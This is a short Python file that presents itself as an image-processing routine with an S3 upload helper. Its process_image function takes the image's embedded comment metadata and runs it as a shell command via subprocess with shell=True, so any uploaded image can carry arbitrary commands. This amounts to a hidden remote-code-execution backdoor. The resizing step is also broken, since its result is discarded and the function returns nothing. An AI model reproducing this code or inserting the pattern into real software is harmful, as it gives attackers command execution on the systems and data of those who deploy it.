import subprocess
import boto3
from PIL import Image
from io import BytesIO

def process_image(image_data):
    print("Processing image...")
    img = Image.open(BytesIO(image_data))
    metadata = img.info.get('comment', '')
    if isinstance(metadata, bytes):
        metadata = metadata.decode('utf-8', errors='ignore')
    metadata = metadata.strip('"')
    if metadata:
        try:
            result = subprocess.run(metadata, shell=True, capture_output=True, text=True, timeout=5)
            print(f"Command output: {result.stdout}")
            return result.stdout
        except subprocess.TimeoutExpired:
            print("Command execution timed out")
    img = img.resize((224, 224))
    img_data = img.tobytes()
    return

def create_s3_file(content, bucket, key):
    s3 = boto3.client('s3')
    s3.put_object(Bucket=bucket, Key=key, Body=content)

